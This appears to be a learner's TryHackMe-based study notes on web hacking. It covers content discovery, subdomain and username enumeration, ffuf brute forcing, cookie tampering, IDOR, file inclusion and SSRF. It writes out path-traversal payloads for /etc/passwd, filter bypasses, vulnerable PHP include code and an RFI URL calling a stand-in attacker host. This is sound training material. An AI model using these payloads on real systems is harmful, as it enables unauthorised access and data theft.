# Web Hacking

Browser Tools 

- **View Source** - Use your browser to view the human-readable source code of a website.
- **Inspector** - Learn how to inspect page elements and make changes to view usually blocked content 
- **Debugger** - Inspect and control the flow of a page's JavaScript 
- **Network** - See all the network requests a page makes 

## Developer Tools (Insepctor)

![image](https://user-images.githubusercontent.com/79100627/165856751-68abf0ed-54ad-4a56-8680-e1c3a3fc73e1.png)

DIV element with the class premium-customer-blocker - you can see the display as **block** </br>
However, you can write the the value of your own choice. Try type **none** </br> 
It will show the original text 

![image](https://user-images.githubusercontent.com/79100627/165856908-68c60f78-6c13-4fa3-9c55-375ee2179e29.png)

## Developer Tools (Debugger) 

Debugger is intended to debugging javascript </br>
As a penetration testers, it gives us the option of digging deep into the JavaScript code 

JavaScript files formats are removed due to the file utilization 

![image](https://user-images.githubusercontent.com/79100627/165858912-87721477-9bc8-4f32-86ea-65f1640c5604.png)

By clicking this, it will format the JS file

![image](https://user-images.githubusercontent.com/79100627/165858974-b94c978b-b0fd-4951-8846-eadf0b75092a.png)

Set the pointer and refresh for the debugging

## Developer Tools (Network)

The network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you will see all the files the page is requesting 

![image](https://user-images.githubusercontent.com/79100627/165859452-04062387-a6f8-4c7d-a7b6-f556bbf507e3.png)

There is a event happening for contact-msg which is the form being submitted in the background using a method called AJAX. AJAX is a method of sending and receiving network data in a web application background without interfering by changing the current web page. 


## What is Content Discovery 

Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we're not talking about the obvious things we can see on a website; it's the thing that aren't immeidately presented to us and that weren't always intended for public access. 

There are three ways of discovering content on a website called **Manually, Automated and OSINT (Open Source Intelligence)**

![image](https://user-images.githubusercontent.com/79100627/165861123-6eb3c5ce-21e3-4132-b1cc-86edf1c9db13.png)

The file contains search engines which pages they are and aren't allowed to show their search engine result or ban specific search engines from crawling the website. 

## Manual Discovery (Favicon)

The favicon is a small icon displayed in the browswer's address bar or tab used for branding a website 

![image](https://user-images.githubusercontent.com/79100627/165861294-fe7a77e9-e0e3-45ff-8316-59f205cbded0.png)

Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer does not replace with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons 

To find the vulnerability of a website 

![image](https://user-images.githubusercontent.com/79100627/165861574-91734266-1b65-4fe1-960a-969e34afb3b4.png)

Here is the icon and if you download favicon and get md5 hash by using curl command and compare with the https://wiki.owasp.org/index.php/OWASP_favicon_database

![image](https://user-images.githubusercontent.com/79100627/165861793-c9fb8b96-1508-4589-9bcd-3ab64f059967.png)


## Maunal Discovery (Sitemap.xml) 

unlike the txt file above, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can contain areas of the website that are bit mroe difficult to navigate to or even list some old webpages that the current site no loger uses but are still working behind the scenes. 

## Manual Discovery (Headers) 

When we make a requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. 

By using the curl command we can see the version of the website and using this information, we could find vulnerable versions of software being used. Try running the below crul command (-v)

![image](https://user-images.githubusercontent.com/79100627/165862848-f8775fb8-19ec-4813-a3f6-65bc2a7e8b82.png)

## Manual Discovery (Framework Stack) 

Once you've established the framework of website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework website. 

## OSINT (Google Hacking / Dorking)

Google Hacking / Dorking utilizeis Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out the results from a certain domain name using the site: filter, for example (site:tryhackme.com) you can then match this up with certain search terms, say, for example, the word admin (stie: tryhackme.com admin) this then would only return results from the tryhackme.com 

![image](https://user-images.githubusercontent.com/79100627/165864053-5b42470f-b307-4a56-995b-c2566c7ddc8f.png)

## Wappalyzer 

Wappalyzer is an online tool and browser extension that helps identify what technologies a website uses, such as framworks, Content Management System(CMS), payment processors and much more, and it can even find version number as well. 

## Automated Discovery

Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists. 

### What are wordlists?

Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the m0st frequenlty used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on THM AttackBox is https://github.com/danielmiessler/SecLists

### Automation Tools

Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster 

## Subdomain Enumeration 

Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potnetial points of vulnerability. 

Different Subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host. 

## What is Subdomain

Subdomains are a prefix added to your domain name in order to help navigate and organize sections of your website. They are primarily used to manage site areas that are extensive enough to require their own hierarchy, such as online stores, blogs, or support platforms 

## OSINT - SSL/TLS Certification

When an SSL/TLS (Secure Socket Layer/ Transport Layer Security) certificate is created for a domain by a CA(Certificate Authroity), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain. sites like https://crt.sh and https://transparencyreport.google.com/https/certificates offer a searchable database of certificates that shows current and historical results. 

## OSINT - Search Engines 

Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narriow the search results. For example, "-site:www.domain.com site:*.domain.com" would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com. 

## DNS BruteForce

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform


## OSINT - Sublist3r 

Automation Using Sublist3r 

To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r
![image](https://user-images.githubusercontent.com/79100627/166008826-ed905c3a-b19f-47ee-b2ab-884fdf878483.png)

## Virtual Hosts 

Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or adminstration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or C:\windows\system32\drivers\etc\hosts file for Window users) which maps domain names to IP address 

Because Web servers can host multiple websites from one server when a website is requrested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we've disovered a new website.

Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains. 

![image](https://user-images.githubusercontent.com/79100627/166010067-cb668c3f-a9e9-435f-b2a4-0ff6d1da79d3.png)

The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host Header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist. 

Because the above command will always produce valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. 

![image](https://user-images.githubusercontent.com/79100627/166054378-bb4b2ebd-42cd-4e7a-af65-c86f01867877.png)

This command has a similar syntax to the first aprt from the -fs swtich, which tells ffuf to ignore any results that are of the specified size. 

## Username Enumeration 

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames

Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT support website (http://10.10.239.104/customers/signup) signup page. 

If you try enterint the username **admin** and fill in the other form fields with fake information, you will see we get the error **An account with this username already exists.** We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches 

![image](https://user-images.githubusercontent.com/79100627/166064008-562edc9c-55bc-4ca9-b85f-f23854d95246.png)

In the above example, the ```-w``` argument selects the file's location on the computer that contains the list of usernames that we're going to check exist. The ```-X``` argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The ```-d``` argument specifies the data that we are going to send. In our example, we have the fields username,email,password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The ```-H``` argument is used for adding additional headers to the request. In this instance, we're setting ``` Content-Type``` to the Webserver knows we are sending form data. The ```-u``` argument specifies the URL we are making the request to, and finally, the ```-mr``` argument is the text on the page we are looking for to validate we've found a valid username. 

## Brute Force 

Using the valid_usernames.txt file, we can now use this to attempt a brute force attack on the login page (http://10.10.239.104/customers/login) 

A brute force attack is an automated process that tries a list of commonly used passwords against either a signle username, or like in our case, a list of usernames.

![image](https://user-images.githubusercontent.com/79100627/166067252-d4959466-c5ec-4f2b-a4c1-6ad9ed969b49.png)

This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen ```W1``` for our list of valid usernames and ```W2``` for the list of passwords we will try. The multiple wordlists are again specified with the ```-w``` argument but separated with a comma. For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.

## Logic Flaw 

Sometimes authentication process contains logical flaws. A logic flaw is when the typical logical path of an application is either by passed, circumvented or manipulated by a hacker. Logical flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![image](https://user-images.githubusercontent.com/79100627/166252576-39420cba-e952-4fb9-a754-68c5ff3c371b.png)

### Logical Flaw Example 

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with/admin, the page is shown to the client. 

```
if(url.substr(0,6) === '/admin') {
  # Code to check user is an admin
}else 
{
  # View Page 
}
```
Because the above PHP code example uses three equals sign(===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting **/adMin** will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks 

### Logical Flaw Example 

![image](https://user-images.githubusercontent.com/79100627/166256463-9449a42f-5720-4914-9938-d2074beae36d.png)

We use the ```-H``` flag to add an additional header to the request. In this instance, we are setting the ```Content-Type``` to ```application/x-www-form-urlencoded```, which lets the web server know we are sending form data so it properly understands our request. In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable ```$_REQUEST```. 

The PHP ```$_REQUEST``` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delievered.

![image](https://user-images.githubusercontent.com/79100627/166258961-db044a96-aa8b-48e1-bc3b-fa2f5d444eca.png)

For next step, you will need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The emailaddress is in the format of ```{username}```@customer.acmeitsupport.thm now rerunning Crul Request 2 but with your @acmeitsupport.thm in the email field you will have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag. 

![image](https://user-images.githubusercontent.com/79100627/166259610-a4244587-2819-4514-8c76-4e56b0e02c50.png)

## Cookie Tampering 

### Plain Text 

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login: 
```
Set-Cookie: logged_in=true; Max-Age=3600;Path=/ 
Set-Cookie: admin=false; Max-Age:3600; Path=/
```

We see one cookie (logged_in) which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin previleges. Using this logic, if we were change the contents of the cookies and make request we will be able to change our privilleges.

![image](https://user-images.githubusercontent.com/79100627/166260958-c82c1a80-c164-4509-9ff2-86a06c3e22af.png)

Now we will send another request with the logged_in cookie set to true and the admin cookie set to false 

![image](https://user-images.githubusercontent.com/79100627/166261213-f034bc0c-332b-46a9-af71-45e6aa9c52d2.png)

We will send one last request setting both the logged_in and admin cookie to true: 

![image](https://user-images.githubusercontent.com/79100627/166261474-a4b369d2-29f9-457b-a9d8-1a18ed16da09.png)

### Hashing 

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. 

### Encoding

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point of encoding?

Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base 32 which converts binary data to the character A-Z and 2-7 and base 64 which converts using the characters a-z, A-Z, 0-9, +, / and the qeuals sign for padding.

Take the below data as an example which is set by the web server upon logging in: 

``` 
Set-Cookie: eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```
This String base 64 decoded has the value of {"id":1,"admin":false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access. 

## IDOR 

IDOR stands for Insecure Direct Object Reference and is type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it. 

## IDOR Example 

Imagine you just signed up for an oline service, and you want to change your profile information. The link you click on goes to http://website/profile?user_id=1305 and you can see your information.

Curiosity gets better of you, and you try changing the user_id value 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can see now see another user's information. You have now discovered an IDOR vulnerability! ideally, there should be a check on the website to confrim that the user information belongs to the user logged requesting it.

## Encoded IDs 

When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into ASCII string commonly using the ```a-z, A-Z, 0-9 and =``` character for padding. The most common encoding technique on the web is base64 encoding and can ususally be pretty easy to spot. You can use website like https://www.base64decode.org/ to decode the string, then edit the data and re-encoding it again using https://www.base64encode.org/ and then resubmit web request to see if there is a change in the response. 

![image](https://user-images.githubusercontent.com/79100627/166289120-63a6f78a-f2c6-4fc6-a9f6-efa5381e086b.png)

## Hashed IDs

Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern such as being the hashed version of the integer value. For example, the ID number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.

It is worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches 

## Finding IDORs in Unpredictable IDs 

Unpredictable IDs 

If the id can not be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the ID numbers between them. If you can view the other user's content using their ID number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability 

## Where are IDORs located

The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details/ details displaying your user information (authenticated through your session). But through attack known as parameter mining, you discover a parameter called user_id that you can use to display other user's information, for exmaple, /user/details?user_id=123

## IDOR Example 

![image](https://user-images.githubusercontent.com/79100627/166291320-69aaf4cc-ce3a-497b-982c-708b5d2b6fe3.png)

![image](https://user-images.githubusercontent.com/79100627/166291398-42c135ca-0bf6-470e-9ef3-9e8c429b607a.png)

Found the vulnerability for Customer ID 

![image](https://user-images.githubusercontent.com/79100627/166291514-bd3a1963-cbf1-4ff2-a6cb-512745ea27ff.png)


## File Inclusion

### What is File Inclusion

Essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. </br>
In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data perform actions based on user input. 

![image](https://user-images.githubusercontent.com/79100627/166558240-a858129a-9734-48fc-b5a3-6340ce5e0ad1.png)

For example, parameters are used with Google Searching, where ```GET``` requests pass user input into the search engine. ```https://www.google.com/search?q=TryHackMe```. Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the web server that includes a file to display. For example, if a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, ```http://webapp.thm/get.php?file=userCV.pdf``` where the ```file``` is the parameter and the ```userCV.pdf```, is the required file to access. 

![image](https://user-images.githubusercontent.com/79100627/166558805-95931b86-d205-4ac2-9b9e-08b4cbb3c83a.png)


## Why do File inclusion vulnerabilities happen? 

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability 

## What is the risk of File Inclusion?

It depends! if the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as ```/tmp``` directory, then it is possible to gain remote command execution RCE. However, it won't be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server. 

## Path Traversal 

Also known as ```Directory Traversal```, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory. 

Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It is most important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. 

The following graph shows how a web application stores files in ```/var/www/app```. The happy path would be the user requesting the contents of userCV.pdf from a defined path ```var/www/app/CVs```. 

![image](https://user-images.githubusercontent.com/79100627/166559999-9500e453-bc2d-4166-8cdf-fbd3cd63535c.png)

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the ```dot-dot-slash``` attack, take advantage of moving the directory one step up using the double dots ```../```. If the attacker finds the entry point, which in this case ```get.php?file=```, then the attacker may send something as follows, ```http://webapp.thm/get.php?file=../../../../etc/passwd``` </br>
Suppose there isn't input validation, and instead of accessing the PDF files at ```/var/www/app/CVs``` location, the web application retrieves files from other directories, which in this case ```/etc/passwd```. Each ```..``` entry moves one directory until it reaches the root directory ```/```. Then it changes the directory to ```/etc```, and from there, it read the ```passwd``` file. 

![image](https://user-images.githubusercontent.com/79100627/166560670-0ac4b86f-9842-4594-98c6-965d03bff22f.png)


As the result, the web application sends back the file's content to the user

![image](https://user-images.githubusercontent.com/79100627/166563572-d0c5b0b5-98d3-4542-b2f5-5aada71ea5a2.png)

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in ```c:\boot.ini``` then the attacker can try the following depending on the target OS version: 
```http://webapp.thm/get.php?file=../../../../boot.ini``` or ```http://webapp.thm/get.php?file=../../../../windows/win.ini```
The same concept applies here as with Linux operating system, where we climb up directories until it reaches the root directory, which is usually ```c:\```.
Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.

![image](https://user-images.githubusercontent.com/79100627/166564002-b3c5fe5b-9983-47ab-bb04-a74240f0f0ae.png)

## Local File Inclusion (LFI)

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as ```include```,```require```,```include_once```, and ```require_once``` often contribute to vulnerable web applications.

1. Suppose the web application provides two languages, and the user can select between the ```EN``` and ```AR```

```
<?PHP
      include($_GET["lang"])
?>
```
The PHP code above uses a ```GET``` request via the URL parameter ```lang``` to include the file of the page. The call can be done by sending the following HTTP request as follows: ```http://webapp.thm/index.php?lang=EN,php``` to load the English page or ```http://webapp.thm/index.php?lang=AR.php``` to load the Arabic page, where EN.php and AR.php files exist in the same directory. 
Theoraetically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the ```/etc/passwd``` file, which contains sensitive information about the users of the Linux operating system, we can try the following: ```http://webapp.thm/get.php?file=/etc/passwd```, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd```

In this case, it works because there isn't a directory specified in the include function and no input validation. 

2. Next, In the following code, the developer decided to specify the directory inside the function.

```
<?PHP
      include("languages/". $_GET['lang']);
 ?>
```

In the above code, the developer decided to use the ```include``` function to call ```PHP``` pages in the languages directory only via ```lang``` parameters. If there is no input validation, the attacker can manipulate the URL by replacing the ```lang``` input with other OS-senstivie files such as ```/etc/passwd```. Again the payload looks similar to the ```path traversal```, but the include function allows us to include any called files into the current page. The following will be the exploit: ```http://webapp.thm/index.php?lang=../../../../etc/passwd```
 
 ## Local File Inclusion #2 
 
 1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing blackbox testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app. 

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input such as THM, we get the following error 

```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like ```include(languages.THM.php);```. If you look at the directory closely, we can tell the function includes files in the language directory adding ```.php``` at the end of the entry. Thus the valid input will be something as follows: ```index.php?lang=EN```, where the file ```EN``` is located inside the given ```languages``` directory and named ```EN.php```

Also, the error message disclosed another important piece of information about the full web application directory path which is ```/var/www/html/THM-4/```

To exploit this, we need to use the ```../```trick, as described in the directory traversal section, to get out the current folder. 

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

Note that we used 4 ```../``` because we know the path has four levels ```/var/www/html/THM-4```. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
It seems we could move out the PHP directory but still, the ```include``` function reads the input with ```.php``` at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BTYE, which is ```%00```.

Using null bytes is an injection technique where URL-encoded representation such as ```%00``` or ```0x00``` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the NULL bytes. 

by adding the Null Byte at the end of the payload, we tell the ```include``` function to ignore anything after the null byte which may look like 

``` include("languages/../../../../../etc/passwd%00").".php"); ``` 
which equivalent to ```include("languages/../../../../etc/passwd");```

NOTE: the ```%00``` trick is fixed and not working with PHP 5.3.4 above. 

2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The ```/etc/passwd``` file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte ```%00``` or the current directory trick at the end of the filtered keyword ```/.```. The exploit will be similar to ```http://webapp.thm/index.php?lang=/etc/passwd/.``` We could also use ```http://webapp.thm/index.php?lang=/etc/passwd%00```. 

To make it clearer, if we try this concept in the file system using ``cd ..``, it will get you back one step; however, if you do ```cd .```, it stays in the current directory. Similarly, if we try ```/etc/passwd/..```, it results to be ```/etc/``` and that's because we moved one to the root. Now if we try ```/etc/passwd/.```, the result will be ```/etc/passwd``` since dot refers to the current directory. 

3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message! 

``` http://webapp.thm/index.php?lang=../../../../etc/passwd```

We got the following error!

``` Warning include(languages/etc/passwd/): falied to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15. ```

If we check the warning message in the ``` include(languages/etc/passwd) ``` section, we know that the web application replaces the ```../``` with the empty string. There are a couple of techniques we can use to bypass this. 

First, we can send the following payload to bypass it: ``` ....//....//....//....//....//etc/passwd ``` 

Why did this work?

This work because the PHP filter matches and replaces the first subset string ``` ../ ``` it finds and does not do another pass

![image](https://user-images.githubusercontent.com/79100627/166819691-82031b30-b8aa-41bb-a244-4758ff7c0920.png)

## Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into ```include``` function. One requirement for RFI is that ```allow_url_fopen``` option needs to be ```on```. 

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include: 

- Sensitive Information Disclosure 
- Cross Scripting (XSS) 
- Denial of Service (DoS) 

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is inejcted into the include function via HTTP requests, and the content of malicious file executes on the vulnerable application server. 

![image](https://user-images.githubusercontent.com/79100627/166822359-57abe026-c07d-4e80-9665-704ae7213610.png)

## RFI steps 

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server ```http://attacker.thm/cmd.txt``` where ```cmd.txt``` contains a printing message ```Hello THM```. 

```
<?PHP echp "Hello THM";?>
```

First attacker injects malicious URL, which points to the attacker's server, such as ```http://webapp.thm.index.php?lang=http://attacker.thm/cmd.txt```. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the ```Hello THM``` message. 

## FI Inclusion Challenges 

### Change the GET to POST 

Open the inspector and change the form < form action="#" method="GET" > to < form action"#" method="POST" >
  
  ![image](https://user-images.githubusercontent.com/79100627/167317338-d3c6137b-c902-429c-8069-065e64f5b71e.png)
  ![image](https://user-images.githubusercontent.com/79100627/167317358-ee8b880e-c58c-44ce-9e56-624d5121d786.png)

### Change the Cookie 

Open the inspector and you can change the cookie value in the **Storage**

![image](https://user-images.githubusercontent.com/79100627/167317615-316119d6-5ba3-4079-97cd-6a9c9c58b1a9.png)


## SSRF

### What is an SSRF?

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing 

## Type of SSRF 

There are two types of SSRF vulnerability; the first is regular SSRF where data is retunred to the attacker's screen.</br>
The second is Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen. </br>

## What is the impact?

A successful SSRF attack can result in any of the following:
- Access to unauthroized areas. 
- Access to customer/organizational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials. 

## SSR Examples 

How attacker can have complete control over the page requested by the webserver. The Expected Request is what the website.thm server is expecting to receive with the section in red being the URL that the website will fetch for the information. The attacker can modify the area in red to an URL of their choice 

![image](https://user-images.githubusercontent.com/79100627/167318372-407038d2-0ce0-4680-a4cf-b76e0a3c4147.png)

This one shows how attacker can still reach the /api/user page with only having control over the patch by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user

![image](https://user-images.githubusercontent.com/79100627/167318453-2df5b5ad-76b9-45ef-9b36-e5a9c9c01c2e.png)

In this example, the attacker can control the server's subdomain to which the request is made. Take note of payload ending in ```&x=``` being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. 

![image](https://user-images.githubusercontent.com/79100627/167318503-da09f98b-8f35-4a0a-ae42-5a2e71d21177.png)

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specific domain. These headers could contain authentication credentials or API keys sent by the website.thm (that would normally authenticate to api.website.thm). 

![image](https://user-images.githubusercontent.com/79100627/167318571-2e1c4773-0562-4428-8932-26395dd81048.png)
